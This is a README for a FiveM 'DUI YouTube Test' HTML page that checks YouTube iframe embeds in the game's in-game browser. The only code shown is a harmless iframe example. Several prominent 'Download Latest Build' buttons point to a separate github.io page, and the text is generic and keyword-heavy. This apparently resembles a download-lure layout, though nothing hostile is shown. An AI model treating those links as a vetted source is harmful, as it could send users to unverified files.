# DUI YouTube Test v2026 - Game Script Utility 2026

> **FiveM DUI test page for checking external YouTube embeds.** This HTML helper is built to confirm DUI behavior and browser-embedded media handling inside FiveM.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/daniel-ward67/dui-youtube-test-v2026?style=flat-square)](https://github.com/daniel-ward67/dui-youtube-test-v2026)

---

<p align="center">
  <a href="https://daniel-ward67.github.io/dui-youtube-test-v2026/">
    <img src="https://img.shields.io/badge/Download-DUI%20YouTube%20Test%20Script-brightgreen?style=for-the-badge" alt="Download DUI YouTube Test Script">
  </a>
</p>

> **[Download Latest Build](https://daniel-ward67.github.io/dui-youtube-test-v2026/)**

---

[Download Latest Build](https://daniel-ward67.github.io/dui-youtube-test-v2026/)

---

## What It Is

DUI YouTube Test is a compact HTML-based test page for FiveM setups that need to validate how an external YouTube embed behaves through DUI. Its job is to check whether a media source loads and displays correctly in a DUI context, which makes it handy when verifying browser-facing content inside the game.

Rather than offering a wide toolkit, this repository keeps the workflow narrow and practical. It is meant for fast checks when you want to confirm external embed handling, compare behavior between environments, or make sure your FiveM DUI configuration is targeting the right page.

---

## Key Features

- External YouTube embed testing for DUI-enabled workflows
- FiveM DUI support for in-game browser rendering checks
- HTML-based page structure for straightforward hosting and editing
- Lightweight test-page layout for quick embed validation
- Useful for confirming external media loading behavior
- Suited to basic environment checks and iterative debugging
- Minimal surface area for focused test scenarios
- Easy to adapt if you need to swap out the embed source

---

## Getting Started

1. Download or clone the repository contents.
2. Place the HTML page in your preferred web host or local test location.
3. Point your FiveM DUI setup to the page URL.
4. Load the page and confirm the embed appears and behaves as expected.

Example usage:

    https://your-host.example/dui-youtube-test/index.html

If you are testing locally, make sure the file path or web server address matches the URL used by your DUI configuration.

---

## Configuration

The project stays simple, but there are still a few values you can tune for different tests:

| Setting | Purpose | Example |
| --- | --- | --- |
| Embed source | Choose the YouTube URL or embed target | `https://www.youtube.com/embed/...` |
| Test page URL | Location loaded by DUI | `https://your-host.example/index.html` |
| HTML content | Edit the page for your test case | `index.html` |
| Browser parameters | Adjust the DUI environment if needed | runtime-specific |

Basic configuration example:

    <iframe
      src="https://www.youtube.com/embed/VIDEO_ID"
      width="100%"
      height="100%"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

---

## Compatibility Notes

This test page is built for FiveM environments that rely on DUI and HTML-based content loading. Because it is centered on external YouTube embeds, the outcome can depend on hosting, network access, browser behavior, and the exact DUI configuration in use.

Known limitations:
- It is not a full gameplay script
- It depends on external embed availability
- Behavior may differ across server, client, or hosting setups
- HTML rendering can be affected by environment-specific restrictions

---

## FAQ

### How do I use this with FiveM?
Host the HTML page, then point your DUI configuration at the URL you want to test.

### Can I change the embed target?
Yes. Edit the HTML so it points to the YouTube video or embed source you want to verify.

### Does this require a specific setup?
It is intended for FiveM DUI workflows along with a basic HTML hosting setup.

### How do I update the test page?
Replace the HTML file with your revised version and reload the URL in your DUI environment.

### Can I customize the page for different tests?
Yes. You can change the embed source, layout, or page content to fit your test case.

### Where should I store the files?
Any location that can serve the HTML page reliably works, as long as the DUI URL points to it.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
